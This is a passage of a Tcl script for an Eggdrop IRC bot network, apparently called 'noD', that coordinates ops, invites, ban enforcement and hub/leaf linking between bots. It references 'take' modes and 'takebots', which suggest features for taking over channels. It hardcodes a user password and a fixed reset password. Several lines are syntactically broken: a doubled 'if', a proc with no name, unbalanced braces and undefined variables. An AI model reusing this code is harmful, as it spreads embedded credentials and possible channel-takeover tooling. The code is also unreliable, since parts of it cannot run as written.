    set bnick [lindex [split $bo !] 0]
    set bhost [lindex [split $bo !] 1]
    set a [lrange $arg 2 end]
    set a [join $a ""]
    if {![validchan [lindex $a 0]]} { return }
    if {(![matchattr $b o]) && (![matchchanattr $b o [lindex $a 0]])}  { putlog "\[noD\] Warning.. $b does not have flag for [lindex $a 0]"; return } 
    if {(![umatchattr $bhost o]) && (![umatchchanattr $bhost o [lindex $a 0]])}  { putlog "\[noD\] Adding $bhost to ${b}'s hosts"; addhost $bo $b; return } 
    if {[info exists g.qd(${bo}.[lindex $a 0])]} { return }
    if {($co == "gque") && ([validchan $c])} { set c [join [lindex $a 0]]; set d [join [lindex $a 1]]
        set g.qd(${bo}.${c}) yes; utimer 10 "chk.gque \"${bo} ${c} ${d} ${b}\""
    }
    if {$co == "on"} {
        if {(![matchattr $b o]) && (![matchchanattr $b o $a])}  { putlog "\[noD\] Warning.. $b is trying to gain ops on $a"; return } 
        if {([botisop $a]) && (![isop $bo $a])} { putbot $b "secb wops $botname $a" }
     }
    if {$co == "op"} {
	if {![botisop $a]} { return }
        if {(![isop $bo $a]) && ([onchan $bo $a])} {
            putallbots "secb gque $bo $a op $b"; secbots "$botnick" "blah" "gque $bo $a op $b"; opuser $bo $a
        }
    } 
    if {$co == "i"}  {
	if {![botisop $a]}  { return } 
        if {![onchan $bo $a]} {
            putallbots "secb gque $bo $a i $b"; secbots "$botnick" "blah" "gque $bo $a i $b";dumpserv "INVITE $bo $a"
        }
    } 
    if {$co == "k"}  {
	if {![botisop $a]} { return } 
        if {![onchan $bo $a]} {
            if {[string match *k* [getchanmode $a]] != "-1"}  {
                putbot $b "secb $botname key $a [lindex [getchanmode $a] 1]"
                putallbots "secb gque $bo $a k $b"; secbots "$botnick" "blah" "gque $bo $a k $b";dumpserv "INVITE $bo $a"
            } 
        }
    } 
    if {$co == "u"}  {
	if {![botisop $a]}  { return } 
        foreach c [chanbans $a] {
            foreach d [gethosts $b] {
                if {([string match $d $c])} {
                    dumpserv "MODE $a -b :$c"
                } 
            }
            putallbots "secb gque $bo $a u $b"; secbots "$botnick" "blah" "gque $bo $a u $b";dumpserv "INVITE $bo $a"
        } 
    } 
    if {$co == "l"}  {
        if {![botisop $a]}  { return } 
        if {![onchan $bo $a]} {
            dumpserv "MODE $a +l [expr [llength [chanlist $a]] + 2]"
            putallbots "secb gque $bo $a l $b"; secbots "$botnick" "blah" "gque $bo $a l $b";dumpserv "INVITE $bo $a"
       } 
    }
    if {$co == "key"}  {
        if {![onchan $botnick [lindex $a 0]]}  {
            dumpserv "JOIN [lindex $a 0] [lindex $a 1]"
        } 
    } 
    if {$co == "wops"}  {
        if {![botisop $a]}  { putbot $b "secb op $botname $a"; return } 
    } 
} 
#end
#begin
proc dccopuser {nik id a}  { global botnick
    set n [join [lindex $a 0]]
    if {[lindex $a 1] == ""}  { putdcc $id "op usage: .op \[user\] \[#channel\]"; return } 
    if {([lindex $a 1] == "*") || ([llength $a] == 1)} { 
        foreach b [channels] {
            if {(([matchattr $n o]) || ([matchchanattr $n o $b])) && ([botisop $b]) && (![isop $n $b])}  { opuser $n $b }  
        }
        putlog "\[noD\] +o'd $n on all channels"; return
       }
    if {([regexp {/+bitch} [getchanmode [lindex $a 1]]]) && (![validuser [hand2nick $a]]) || (![validuser $n]) || ([finduser *![getchanhost $n [lindex $a 1]]] == "*")} { putdcc $id "\[noD\] Can't Op $n not vaild user sorry"; return }
    if {![onchan $botnick [lindex $a 1]]} { putdcc $id "\[noD\] User is not on [lindex $a 1]"; return }
    opuser $n [lindex $a 1]
    putlog "\[noD\] Opped $n on [lindex $a 1]"
    return 1
}

bind raw - MODE chkmodes
proc chkmodes {f k a} { global botnick mdopl
    set a [split [string trim $a] " "]
    set ch [join [lindex $a 0]]
    set nick [lindex [split $f !] 0]
    set uhost [lindex [split $f !] 1]
    regsub -all {\+} [lindex $a 1] { +} modes
    regsub -all {\-} $modes { -} modes
    set modes [string trimleft $modes " "]
 
    foreach m $modes {
     set sign [string range $m 0 0]; regsub -all {} [string range $m 1 end] $sign modes1
     append modes2 $modes1
    }
    set modes $modes2
    set x 2
    if {([regexp {\-b} $modes])} {
        regsub -all {\+} $modes { +} d1
        if {[info exists d1]} { regsub -all {\-} $d1 { -} d1 }
        if {![info exists d1]} { regsub -all {\-} $modes { -} d1 }
        set d1 [string trimleft $d1 " "]
        set d $d1
        foreach c $d {
            if {![botisop $ch]} { continue }
            if {[string range $c 0 0] == "+"} { continue }
            regsub -all {\-} $c {} d; regsub -all {\+} $d {} d; regsub -all {} $d { } d
            if {![regexp {\b} $c]} { continue }
            set i 1
            if {![isban [lindex $a $x] $ch]} { continue }
            if {![regexp {\+enforcebans} [channel info $ch]]} { continue }
            if {([umatchattr $uhost f]) || ([umatchchanattr $uhost f $ch])} { set i 0 }
            if $i { dumpserv "KICK $ch $nick :Don't Unban my Bans.." }
            dumpserv "MODE $ch +b [lindex $a $x]"
            putlog "\[noD\] enforcing ban ([lindex $a $x]) on ${ch}, dumb $nick"
            incr x
        }
    }
    if {[regexp {\+o} $modes]} {
        regsub -all {\+} $modes { +} d1
        if {[info exists d1]} { regsub -all {\-} $d1 { -} d1 }
        if {![info exists d1]} { regsub -all {\-} $modes { -} d1 }
        set d1 [string trimleft $d1 " "]
        set d $d1
        set opnick 2
        set dnick 0
        foreach b $d {
            if {[lindex $a $opnick] == $botnick} { secb wops $ch; incr opnick; continue }
            if {[isop [lindex $a $opnick] $ch]} { continue }
            if {![botisop $ch]} { continue }
            if {[string range $b 0 0] == "-"} { incr opnick; continue }
            regsub -all {\+} $b {} c; regsub -all {\-} $c {} c; regsub -all {} $c { } c
            if {![regexp {\o} $c]} { incr opnick; continue }
            set bot 0
            if {[set botuser [finduser *!$uhost]] != "*"} { if {[matchattr $botuser b]} { set bot 1 } }
            if {$nick == $botnick} { set bot 1 }
            if $bot { 
                if {![regexp {\-b} [lindex $a 1]]} { pushmode $ch -o [lindex $a 2]; putlog "\[noD\] NO Key bot: $nick user: [lindex $a 2] chan: $ch" }
                set opkey [dop.cookie [lindex [split [lindex $a 3] @] 0] $ch $nick [lindex $a 2]]
                if {[lindex [split [lindex $a 3] @] 1] != $opkey} { pushmode $ch -o [lindex $a 2]; putlog "\[noD\] WRONG key bot: $nick user: [lindex $a 2] chan: $ch" }
                incr opnick
                break
            }
            if {![regexp {\+bitch} [channel info $ch]]} { incr opnick; continue }
            if {(![umatchchanattr [getchanhost [lindex $a $opnick] $ch] o $ch]) || (![umatchattr [getchanhost [lindex $a $opnick] $ch] o]) && ([regexp {\+bitch} [channel info $ch]])} {
	        pushmode $ch -o [lindex $a $opnick]; set dnick 1; putlog "\[nod\] $nick opped [lindex $a $opnick] on $ch" 
	    }
            incr opnick
        }
        if {$dnick} { pushmode $ch -o $nick }
    }
    if {[regexp {\-o} $modes]} {
	regsub -all {\+} $modes { +} d1
        if {[info exists d1]} { regsub -all {\-} $d1 { -} d1 }
        if {![info exists d1]} { regsub -all {\-} $modes { -} d1 }
        set d1 [string trimleft $d1 " "]
        set d $d1
        set dopn 2
        foreach b $d {
            if {![isop [lindex $a $dopn] $ch]} { continue }
            if {[string range $b 0 0] == "+"} { continue }
            regsub -all {\+} $b {} c; regsub -all {\-} $d {} c; regsub -all {} $d { } c
            if {![regexp {\o} $b]} { continue }
            if {[lindex $a $dopn] == $botnick} { secb op $ch }
            if {![botisop $ch]} { continue }
	    set guser 1
            if {([umatchattr $uhost o]) || ([umatchchanattr $uhost o $ch])} { set guser 0; if if {([umatchattr $uhost o]) || ([umatchchanattr $uhost o $ch])} { set b } 
            if {([umatchattr [getchanhost [lindex $a $dopn] $ch] o]) || ([umatchchanattr [getchanhost [lindex $a $dopn] $ch] o $ch]) && ([regexp {\+protectops\} [channel info $ch]])} { if $guser { dumpserv "KICK $ch $nick :Please Don't Deop Users." }
	    }
        }
    }
    return
}
bind bot b nvalid bot:nvalid
proc bot:nvalid {b co a} { global source1 dkey cnt
    set c [lindex $a 0]
    set o [lindex $a 1]
    set md5s [lindex $a 2]
    switch $c {
        mdeop { if {$md5s != [md5file $source1]} { putallbots "punishbot [hand2idx $b] md5sum error"; chattr $b -[chattr $b]+rdk; putlog "md5sum ($b) Error: Killing"; if {$hub == ${botnet-nick}} { putbot $b "die $dkey" }; unlink $b } }
    }
}
bind bot h die bot:die
proc bot:die {b co a} { global dkey botnick botnet-nick
    if {[lindex $a 1] == $dkey]} { putallbots "chattr ${botnet-nick} -ofblhs+rdk"; unlink $hub 
        foreach c [channels] { 
	    if {[botisop $c]} { dumpserv "mode -o $c $botnick" }
        }
    }
    set cnt 0
}
bind bot b invalid bot:valid
proc bot:valid {b co a} { global source1
    set c [lindex $a 0]
    set o [lindex $a 1]
    switch c {
        mdeop {
	    if {[regexp {\+take} [channel info $o]] || [regexp {\+close} [channel info $o]] || [regexp {\+bitch} [channel info $o]]} { putbot $b "vaild mdeop $o"; return }
	    putbot "nvalid mdeop $o [md5file $source1]"; return
	}
    }
}
unbind dcc - op *dcc:op
bind dcc o op dccopuser
proc opuser {n c} { set n [join $n]; set c [join $c]
    global {botnet-nick} pass botnick botname
    if {(![onchan $n $c]) || ([isop $n $c])} { return }
    set encrypted [eop.cookie $c $botnick $n]
    dumpserv "mode $c +o-b $n $encrypted"
}
proc eop.cookie {c u n} {  
    set un [unixtime]
    return [encrypt $un key]@[encrypt $u [encrypt $un [encrypt $c $n]]]
}
proc dop.cookie {i c u n} { set un [decrypt $i key]; return [encrypt $u [encrypt $i [encrypt $c $n]]] }
proc crs2 {a}  { global userpass; return [encrypt $a $userpass] } 

unbind msg - help *msg:help
unbind msg - op *msg:op
bind msg o|o op msg:op
unbind msg - invite *msg:invite
unbind msg - unban *msg:unban
unbind msg - ident *msg:ident
unbind msg - addhost *msg:addhost
unbind msg - info *msg:info
unbind msg - who *msg:who
unbind msg - hello *msg:hello
unbind msg - whois *msg:whois
unbind msg - status *msg:status
unbind msg - die *msg:die
bind msg - die msg:die
unbind msg - memory *msg:memory
unbind msg - rehash *msg:rehash
unbind msg - reset *msg:reset
unbind msg - go *msg:go
unbind msg - jump *msg:jump
unbind dcc - su *dcc:su
unbind dcc - binds *dcc:binds

bind dcc n userpass dcc:setpass

proc dcc:setpass {n id a}  {
    global userpass
    if {$a == ""} { putdcc $id ".userpass \[password\]"; return 0 } 
    if {[dcc:chk_setpass $id $a]}  { return 1 } 
}

bind dcc n con dcc:con
proc {n id a} { global cnt
    set cnt 1
}

proc dis.nopass {} { global nopass
    foreach u {[userlist]} {
        if {![passwdok $u -]} { if {[info exists nopass($u)]} { unset nopass($u) }; continue }
        if {$u == "*ban"} { continue }
        if {![info exists nopass($u)]} { set nopass($u) 0 }
        if {[info exists nopass($u)]} { incr nopass($u) }
        if {$nopass($u) == 3} { chattr $u -mnofbph; chpass $u r4!b0y; putlog "\[noD\] $u chattr'd and pass changed!"; unset nopass($u); continue }
        lappend nps "$u \(# $nopass($u) Warning\)"
    }
    if {[info exists nps]} { putlog "\[noD\] Dumb Users(3 strikes your out!): [join [split $nps]]" }
}

proc msg:die {n u h a}  {
    dumpserv "NOTICE $N nice try.. removing your flags"
    putallbots "chattr user $h -nmop+d"
    chattr $h -nmop+ds
}

bind msg p dccme dccme
proc dccme {n u h a} {
    global listenp
    puthelp "PRIVMSG $n :\1DCC CHAT chat [myip] $listenp\1"
}

proc optb {a} { global {botnet-nick} botnick
    putallbots "wops $botnick $a"
}
proc kdpall {n}  { 
    foreach c [channels] {
        if {([botisop $c]) && ([isop $n $c])}  { dumpserv "MODE $c -o+b $n $n!*@*\nKICK $c $n :Gone!" } 
    }
}

bind chon - * chk_usersec
proc set_uspass {i a}  {
    if {$a == ""}  { putdcc $id "\[noD\] You must set a userpass! ex. \K\!\#\K\a\$\$"; return 0 } 
    if {[dcc:chksetpass $i $a]}  { return 1 } 
}

proc dcc:chksetpass {i a}  { global userpass
    if {[string length $a] < 6}  {putdcc $i "\[noD\] pass must to be longer than 6 letters"; return 0} 
    if {[string match *[string tolower [idx2hand $i]]* [string tolower $a]]}  {putdcc $i "\[noD\] Don't use your nick as a pass!"; return 0 } 
    if {![string match $a "*a*b*c*d*e*f*g*h*i*j*k*l*m*n*o*p*q*r*s*t*u*v*w*x*y*z*"]}  {putdcc $i "\[noD\] pass must have low and high case, number, and special characters"; return 0} 
    if {![string match $a "*A*B*C*D*E*F*G*H*I*J*K*L*M*N*O*P*Q*R*S*T*U*V*W*X*Y*Z*"]}  {putdcc $i "\[noD\] pass must have low and high case, number, and special characters"; return 0} 
    if {![string match $a "*\!*\@*\#*\$*\%*\^*\&*\*\*(*\)*"]}  {putdcc $i "\[noD\] pass must have low and high case, number, and special characters"; return 0} 
    if {![string match $a "*1*2*3*4*5*6*7*8*9*0*"]}  {putdcc $i "\[noD\] pass must have low and high case, number, and special characters"; return 0} 
    if {$a == "\K\!\#\K\a\$\$"}  {return 0} 
    set userpass [encrypt $a $a]
    putdcc $i "Set userpass!"
    return 1
}

proc chk_usersec {h i}  { 
    global iversion chk_permp userpass
    if {[info exists $userpass]}  { putdcc $i "User Pass has not been set please choose a word for the user pass"; control $i set_uspass; return } 
    putdcc $i "$iversion Need Perminsion Key\37:\37"; control $i chk_perm
} 
set default-flags "p"

proc chk_perm {i a}  {
    global chk_permt chk_permp
    if {$a == ""}  { putlog "\[noD\] Connection Closed [idx2hand $i]"; timer 1 unset chk_permt($i) } 
    if {[encrypt $a $a] == $chk_permp}  { if [info exists chk_perm($i)] { unset chk_perm($i) }; return 1 } 
    if {![info exists chk_perm($i)]}  { set chk_perm($i) 1 } 
    if {$chk_perm($i) == 3} { putdcc $i "Incorrect password good bye!"; killdcc $i; putallbots "chattr user [hand2idx $i] -mnop"; chattr [hand2idx $i]; killdcc $id; return 0 } 
    putdcc $i "Wrong Password! Good Bye"; killdcc $i; incr chk_perm($i); timer 3 "chk_timerp $i"; return 0
} 

bind bot b chattr cchattr

proc cchattr {b c a}  { chattr $a }

bind dcc n bots lbots
proc lbots {n id a} { global {botnet-nick}
    set allbots [userlist +b]
    set downbots ""
    foreach b $allbots {
     if {${botnet-nick} == $b} { continue }
     if {[bots] == ""} { lappend downbots $b; continue }
     if {![regexp $b [bots]]} { lappend downbots $b; continue }
    }
    putdcc $id "\[noD\] [llength [bots]] Bots Up, [llength $downbots] Bots Down."
    putdcc $id "\[noD\] All bots: $allbots"
    putdcc $id "\[noD\] Up Bots: [bots]"
    putdcc $id "\[noD\] Down Bots: $downbots"
}

bind dcc n +hub newhub 
proc newhub {n id a} { global {botnet-nick} hub hubpass
    if {${botnet-nick} != $hub} { putdcc $id "\[noD\] You can only change the hub from the hub bot! $hub"; return }
    if {([llength $a] <= 2) || ($a == "")} { putdcc $id ".+hub \[bot\] \[username\] \[ip:port\]"; return }
    if {([validuser [lindex $a 0]]) && (![matchattr [lindex $a 0] b])} { putdcc $id "\[noD\] ERROR can't set [lindex $a 0] as new hub, it is a user!"; return }
    if {[validuser [lindex $a 0]]} { deluser [lindex $a 0] }
    putallbots "newhub $a"
    set hubnew [addbot [lindex $a 0] [lindex $a 2]]
    if {$hubnew} {
        unlink $hub
        set hub [lindex $a 0]
        chattr $hub +bohs-l
        chpass $hub $hubpass
        addhost $hub *![lindex $a 1]@[lindex [split [lindex $a 2] :] 0]
        addhost $hub *![lindex $a 1]@[gethost [lindex [split [lindex $a 2] :] 0]]
        link $hubnew
        putlog "\[noD\] NEW HUB: $hub"
    }
}

bind dcc n +leaf newleaf
proc newleaf {n id a} { global {botnet-nick} hubpass hub
    if {${botnet-nick} != $hub} { putdcc $id "\[noD\] You can only add leafs from the hub bot! $hub"; return }
    if {([llength $a] == 1) || ($a == "")} { putdcc $id ".+leaf \[bot\] \[username\] \[ip:port\]"; return }
    if {([validuser [lindex $a 0]]) && (![matchattr [lindex $a 0] b])} { putdcc $id "\[noD\] ERROR can't set [lindex $a 0] as a new leaf, it is a user!"; return }
    if {[validuser [lindex $a 0]]} { deluser [lindex $a 0] }
    putallbots "newleaf $a"
    set leafnew [addbot [lindex $a 0] [lindex $a 2]]
    if {$leafnew} {
        chattr [lindex $a 0] +lasbo-h
        chpass [lindex $a 0] $hubpass
        addhost [lindex $a 0] *![lindex $a 1]@[lindex [split [lindex $a 2] :] 0]
        addhost [lindex $a 0] *![lindex $a 1]@[gethost [lindex [split [lindex $a 2] :] 0]]
        putlog "\[noD\] NEW LEAF: [lindex $a 0]"
    }
}

bind bot h newleaf addleaf
proc addleaf {b co a} {
    if {[validuser [lindex $a 0]]} { deluser [lindex $a 0] }
    set leafnew [addbot [lindex $a 0] [lindex $a 1]]
    if {$leafnew} {
        chattr [lindex $a 0] +lasbo-h
        chpass [lindex $a 0] $hubpass
        addhost [lindex $a 0] *![lindex $a 1]@[lindex [split [lindex $a 2] :] 0]
        addhost [lindex $a 0] *![lindex $a 1]@[gethost [lindex [split [lindex $a 2] :] 0]]
        putlog "\[noD\] NEW LEAF: [lindex $a 0]"
    }
}

bind bot h newhub addhub
proc addhub {b co a} {
    if {[validuser [lindex $a 0]]} { deluser [lindex $a 0] }
    set hubnew [addbot [lindex $a 0] [lindex $a 2]]
    if {$hubnew} {
        unlink $hub
        set hub [lindex $a 0]
        chattr $hub +bohs-l
        addhost $hub
        chpass $hub $hubpass
        addhost $hub *![lindex $a 1]@[lindex [split [lindex $a 2] :] 0]
        addhost $hub *![lindex $a 1]@[gethost [lindex [split [lindex $a 2] :] 0]]
        link $hub
        putlog "\[noD\] NEW HUB: $hub"
    }
}

proc randchars {n}  {
    set rchars "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
    set rand "[rand [string length $rchars]]"
    set mchar "[string range $rchars $rand $rand]"
    set i 0;while {[expr $n - 1] > $i}  {
        set rand "[rand [string length $rchars]]"
        append mchar "[string range $rchars $rand $rand]"; incr i
    }
    return $mchar
}
set userpass "CSL2q05u1KK0"

bind bot h pass stpass
proc stpass {bot co a} { global pass; set pass $a } 

set chk_permp $userpass

foreach b $servers {
    if {![info exists servers1]} { set servers1 "" }
    set servers1 [linsert servers1 [rand [llength $servers]] "$b"]
}

set servers2 $servers1
if {${botnet-nick} != $hub}  {
   putlog "\[noD\] My Hub is: $hub"
   set botmode leaf
    if {![regexp $hub [userlist]]} { 
        addbot $hub $hublink
        addhost $hub [lindex [split $hublink :] 0]
        chpass $hub $hubpass
        chattr $hub +obhs-l
    }
    if {![regexp $hub [bots]]} {  putlog "\[noD\] Leaf bot: connecting to hub"; link $hub }
    set passive 1
} else {
    putlog "\[noD\] Hub bot!"
    set pass [randchars [expr 4 + [rand 5]]]
    if {[bots] == ""} { putallbots "pass $pass" }
    set botmode hub; set passive 0 
}
putlog "\[noD\] Current takebots: '[userlist +b0]' :none if blank"
if {[timers] != ""} { set timeri "[join [split [timers]]]"; if {[regexp dis.nopass $timeri]} { killtimer [lindex $timeri [expr [lsearch $timeri "dis.nopass"] + 1]] } }
timer 5 "dis.nopass"
#end
